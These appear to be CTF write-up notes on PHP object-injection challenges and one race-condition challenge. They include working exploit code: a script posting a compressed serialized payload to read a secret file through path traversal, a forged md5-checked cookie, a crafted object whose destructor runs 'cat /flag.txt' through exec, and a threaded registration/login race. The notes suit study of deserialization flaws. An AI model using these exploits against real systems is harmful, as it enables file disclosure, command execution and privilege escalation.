# Serialization

## lolshop

We wanto to exploit the `restore` function, since it has a vulnerability which can allow execution of non serialized malicious code. Ideally we would also like to exploit the `getPicture` function in `products.php`, since it has an hardcoded path into it. Note that it is also called into a `toDict` function.

To recap: we need to read the secret file. We have a compressed internal state variable, which we would like to decode. It is send back and forth via requests and it is encoded in base 64:

```python
import zlib
zlib.decompress(state)
```

The result is a php serialized object. We can inject anything we want into it. We need another class / more than on class to get a print of the secret file present in the server's file system.

### In a nutshell

If we send a product instead of a state, the `toDict` of the product is going to be called. The output will contain the `getPicture` function, which will read from the filesystem the path we want, which will be the secret file. Code for that:

```python
import zlib, base64, requests, subprocess
from IPython import embed

obj = subprocess.check_output(['php', 'payload.php'])
payload = base64.b64encode(zlib.compress(obj))
print('encoded payload: {}'.format(payload.decode('utf-8')))

print('sending payload...')
r = requests.post("http://jinblack.it:3006/api/cart.php", data={
  'state': payload
})
print('status code: {}'.format(r))
embed()
```

What do we put in the `payload.php` script? The quickest way to generate the PHP code is to use the php shell (`php -a`):

```php
php > ...
php > $p = new Product(0, 'xcv', 'xcv', '../../../../secret/flag.txt', 0);
php > echo serialize($p);
```

In the first line we copied into the console all the class code from the website source code.

**Note:** HTTP status code 500 means internal serve error. It is good, since it means that there's something wrong that we can exploit.

## free-as-in-beer

We do not have any source code... We just have the url of the challenge, and some hints: we know that the flag is contained in the `flag.php` file, and that we'll probably find some exploitable code if we look carefully. In fact we can find some PHP source code in plain text:

```php
*/?><?php

Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}


if(isset($_GET['source'])){
    $s = new GPLSourceBloater();
    $s->source = __FILE__;

    echo $s;
    exit;
}

$todos = [];

if(isset($_COOKIE['todos'])){
    $c = $_COOKIE['todos'];
    $h = substr($c, 0, 32);
    $m = substr($c, 32);

    if(md5($m) === $h){
        $todos = unserialize($m);
    }
}

if(isset($_POST['text'])){
    $todo = $_POST['text'];

    $todos[] = $todo;
    $m = serialize($todos);
    $h = md5($m);

    setcookie('todos', $h.$m);

    header('Location: '.$_SERVER['REQUEST_URI']);
    exit;
}

?>
<html>
<head>
    <style>
    * {font-family: "Comic Sans MS", cursive, sans-serif}
    </style>
</head>

<h1>My open/libre/free/PHP/Linux/systemd/GNU TODO List</h1>
<a href="?source"><h2>It's super secure, see for yourself</h2></a>
<ul>
<?php foreach($todos as $todo):?>
    <li><?=$todo?></li>
<?php endforeach;?>
</ul>

<form method="post" href=".">
    <textarea name="text"></textarea>
    <input type="submit" value="store">
</form>
```

I'm a bit of a novice in PHP, so let's look more carefully at what we're dealing with. Here's some notes:

* ```php
  substr(string $string, int $offset, ?int $length = null): string
  ```

  Returns the portion of `string` specified by the `offset` and `length` parameters.

* ```php
  md5(string $string, bool $binary = false): string
  ```

  Calculates the MD5 hash of `string` using the [» RSA Data Security, Inc. MD5 Message-Digest Algorithm](http://www.faqs.org/rfcs/rfc1321), and returns that hash.

* [`__FILE__`](http://us2.php.net/manual/en/language.constants.predefined.php) is a magic constant that gives you the filesystem path to the current .php file (the one that `__FILE__` is in, not the one it's included by if it's an include.

* `REQUEST_URI`: The URI which was given in order to access this page; for instance, '`/index.html`'.

* ```php
  header(string $header, bool $replace = true, int $response_code = 0): void
  ```

  **header()** is used to send a raw HTTP header. See the [» HTTP/1.1 specification](http://www.faqs.org/rfcs/rfc2616) for more information on HTTP headers.

### A first approach

This is the exploitable part of the code, leaked in the html of the page:

```php
Class GPLSourceBloater{
    public function __toString()
    {
        return highlight_file('license.txt', true).highlight_file($this->source, true);
    }
}


if(isset($_GET['source'])){
    $s = new GPLSourceBloater();
    $s->source = __FILE__;

    echo $s;
    exit;
}
```

**PHP magic methods recall**

Recall on magic methods such as `__toString`:

>Magic methods are special methods which override PHP's default's action when certain actions are performed on an object.
>
>**Caution**
>
>All methods names starting with `__` are reserved by PHP. Therefore, it is not recommended to use such method names unless overriding PHP's behavior.
>
>...
>
>```php
>public __toString(): string
>```
>
>The [__toString()](https://www.php.net/manual/en/language.oop5.magic.php#object.tostring) method allows a class to decide how it will react when it is treated like a string. For example, what `echo $obj;` will print.
>
>Source: [PHP: Magic Methods - Manual](https://www.php.net/manual/en/language.oop5.magic.php)

**To recap**

Basically we need to serialize an instance of the `GPLSourceBloater` class with the `source` variable setted as `flag.php`. To achieve that we create the object, serialize it, and put it in the `todos` array. After that it's just a matter of sending a GET to the server with our custom cookie and the flag will be printed.

## metactf

More complex than free-as-in-beer. We have two classes: `User` and `Challenge`:

```php
<?php
// ini_set('display_errors', 1);
// ini_set('display_startup_errors', 1);
// error_reporting(E_ALL);
// error_reporting(0);

class User{
  public $name;
  public $id;
  public $isAdmin;
  public $solved;
  public $points;

  function __construct($id, $name){
    $this->id = $id;
    $this->name = $name;
    $this->isAdmin = false;
    $this->solved = array();
    $this->points = 0;
  
  }

  function setSolved($challid){
    array_push($this->solved, $challid);
  }

}

class Challenge{
  //WIP Not used yet.
  public $name;
  public $description;
  public $setup_cmd=NULL;
  // public $check_cmd=NULL;
  public $stop_cmd=NULL;

  function __construct($name, $description){
    $this->name = $name;
    $this->description = $description;
  }

  function start(){
    if(!is_null($this->setup_cmd)){
      $output=null;
      $retval=null;
      echo("Starting challenge!");
      exec($this->setup_cmp, $output, $retval);
      echo($output[0]);
    }
  }

  function stop(){
    if(!is_null($this->stop_cmd)){
      $output=null;
      $retval=null;
      echo("Stoping challenge!");
      exec($this->stop_cmd, $output, $retval);
      echo($output[0]);
    }
  }
  
  function __destruct(){
    $this->stop();
  }
}
?>
```

We can both download and upload user objects: those get serialized before being downloaded, and unserialized after being uploaded. Since the web app hasn't got any user input validation/sanitization, we can put everything we want into the user object.

**About user objects**

Here's what we get if we create a user and download its serialized object:

```php
O:4:"User":5:{s:4:"name";s:3:"zzz";s:2:"id";i:6904;s:7:"isAdmin";b:0;s:6:"solved";a:0:{}s:6:"points";i:0;}%
```

Which becomes:

```php
object(User)#1 (5) {
  ["name"]=>
  string(3) "zzz"
  ["id"]=>
  int(6904)
  ["isAdmin"]=>
  bool(false)
  ["solved"]=>
  array(0) {
  }
  ["points"]=>
  int(0)
}
```

**Note about `fetch_assoc()`**

```php
$info = $res->fetch_assoc();
$isadmin = $info['isadmin'] == 1;
$res->close();
return $isadmin;
```

It is used to fetch a result row as an associative array.

**Magic methods in this challenge**

* `__construct`: If you create a `__construct()` function, PHP will automatically call this function when you create an object from a class.
* `__destruct`: If you create a `__destruct()` function, PHP will automatically call this function at the end of the script. This is the method we'll exploit to leak the flag.

### A first approach

I tried downloading the default user object created by the website, changing the number of points and setting `isAdmin` to `true`:

```php
❯ php user.php
object(User)#1 (5) {
  ["name"]=>
  string(3) "123"
  ["id"]=>
  int(0)
  ["isAdmin"]=>
  bool(true)
  ["solved"]=>
  array(0) {
  }
  ["points"]=>
  int(999)
}
O:4:"User":5:{s:4:"name";s:3:"123";s:2:"id";i:0;s:7:"isAdmin";b:1;s:6:"solved";a:0:{}s:6:"points";i:999;}
```

~~Thanks to that I managed to print a test challenge in the homepage of the app~~ Actually this is not true, as you'll see later on:

># Welcome to METACTF
>
>Name: Test Challenge
>
>Desc: This is an enabled test challenge
>
>Points: 100

The code above gets printed for every user, admin or not.

### The solution

Since in the code of the `Challenge` class we can execute arbitrary shell commands, we could try executing `cat /flag.txt`. First we need to instantiate a new object, which we did (Test Challenge). Then we need to delete it, which will call the `__destruct()` magic method, which will call the `stop()` function. If we previously set `$c->stop_cmp = 'cat /flag.txt'`, we should be all set. Still we need a way to manipulate the object...

**`array_push()`**

```php
array_push(array &$array, mixed ...$values): int
```

**array_push()** treats `array` as a stack, and pushes the passed variables onto the end of `array`. The length of `array` increases by the number of variables pushed. Has the same effect as:

```php
<?php
$array[] = $var;
?>
```

**`exec` in PHP**

```php
exec(string $command, array &$output = null, int &$result_code = null): string|false
```

* `command`: The command that will be executed.
* `output`: If the `output` argument is present, then the specified array will be filled with every line of output from the command. Trailing whitespace, such as `\n`, is not included in this array. Note that if the array already contains some elements, **exec()** will append to the end of the array. If you do not want the function to append elements, call [unset()](https://www.php.net/manual/en/function.unset.php) on the array before passing it to **exec()**.
* `result_code`: If the `result_code` argument is present along with the `output` argument, then the return status of the executed command will be written to this variable.

**To recap**

We just needed to serialize a specially crafted `Challenge` object and to put it into the file that would be uploaded...

```php
$c = new Challenge('bogus challenge', "just trying to print the flag, nothing to see here");
$c->stop_cmd = 'cat /flag.txt';
print(serialize($c));
```

Then, after uploading this, we load `index.php` and we'll get:

># Welcome to METACTF
>
>User Backup file: 
>
>
>
>Load User
>
>Stoping challenge!flag{nice_yuo_got_the_unserialize_flag!}

## metarace

Same webapp as metactf, but different exploit: we need to registrate, login and get to the homepage before that the registration is finished. This is because at registration time the user is setted as non admin, which means that he cannot see all the challenges present in the database. If we are able to send a login request and to get the index.php faster than that, we'll be able to print what we need.

* `register.php`

  ```php
  $db->create_user($name, $password);
  $id = $db->get_idusers($name);
  if ($db->get_admin($id) &&  $db->get_username($id) === $name){
    $db->fix_user($id);
  }
  ```

* `login.php`

  ```php
  $id = $db->login($name, $password);
  if (($id != 0) && !is_null($id)){
    echo("<h3>Login Completed!</h3>");
    $_SESSION['challenges'] = $db->get_challenges($id, $db->get_admin($id) );
    $_SESSION['user'] = new User($id, $db->get_username($id));
  }
  ```

* `db.php`

  * `fix_user`

    ```php
    function fix_user($idusers){
            /* Prepared statement, stage 1: prepare */
            if (!($stmt = $this->mysqli->prepare("UPDATE users SET isadmin = 0 WHERE idusers = ?"))) {
                echo "Prepare failed: (" . $this->mysqli->errno . ") " . $this->mysqli->error;
            }
    
            /* Prepared statement, stage 2: bind and execute */
            if (!$stmt->bind_param("i", $idusers)) {
                echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
            }
    
            if (!$stmt->execute()) {
                echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
            }
    
        }
    ```

  * `get_admin()`

    ```php
    function get_admin($id){
            /* Prepared statement, stage 1: prepare */
            if (!($stmt = $this->mysqli->prepare("SELECT isadmin FROM users WHERE idusers=?"))) {
                echo "Prepare failed: (" . $this->mysqli->errno . ") " . $this->mysqli->error;
            }
    
            /* Prepared statement, stage 2: bind and execute */
            if (!$stmt->bind_param("i", $id)) {
                echo "Binding parameters failed: (" . $stmt->errno . ") " . $stmt->error;
            }
    
            if (!$stmt->execute()) {
                echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
            }
    
            if (!($res = $stmt->get_result())) {
                echo "Getting result set failed: (" . $stmt->errno . ") " . $stmt->error;
            }
            $info = $res->fetch_assoc();
            $isadmin = $info['isadmin'] == 1;
            $res->close();
            return $isadmin;
        }
    ```

  * `get_challenges()`

    ```php
    function get_challenges($id, $isadmin){
            if ($isadmin){
                /* Prepared statement, stage 1: prepare */
                if (!($stmt = $this->mysqli->prepare("SELECT name, descriptions, points FROM challenges"))) {
                    echo "Prepare failed: (" . $this->mysqli->errno . ") " . $this->mysqli->error;
                }
            }
            else{
                /* Prepared statement, stage 1: prepare */
                if (!($stmt = $this->mysqli->prepare("SELECT name, descriptions, points FROM challenges WHERE isenabled=true"))) {
                    echo "Prepare failed: (" . $this->mysqli->errno . ") " . $this->mysqli->error;
                }
    
            }
    
            if (!$stmt->execute()) {
                echo "Execute failed: (" . $stmt->errno . ") " . $stmt->error;
            }
    
            if (!($res = $stmt->get_result())) {
                echo "Getting result set failed: (" . $stmt->errno . ") " . $stmt->error;
            }
            $challenges = array();
    
            while ($info = $res->fetch_assoc()){
                array_push($challenges, $info);
            }
            $res->close();
            return $challenges;
        }
    ```

  ### The solution

  Quite straightforward: we setup two threads and we try to login and get to the home page of the website while the registration is still ongoing in order to be faster than the `fix_user` function, which would block access to the database.
  
  ```python
  def registration(s, user, password):
    url = "%s/register.php" % HOST
    r = s.post(url, data={'username': user, 'password_1': password, 'password_2': password, 'reg_user': ''})
    #get_body(r)
    if "Registration Completed!" in r.text:
      return True
    return False 
   
  def login(s, user, password):
    url = "%s/login.php" % HOST
    r = s.post(url, data={'username': user, 'password': password, 'log_user' : ''})
    r = s.get(HOST)
    if 'flag{' in r.text:
      get_body(r)
  
  print('setting up session...')
  s = Session()
  print('starting loop...')
  while True:
    username = randomString(10)
    password = randomString(10)
    r = threading.Thread(target=registration, args=(s, username, password))
    l = threading.Thread(target=login, args=(s, username, password))
    r.start()
    l.start() 
  ```
  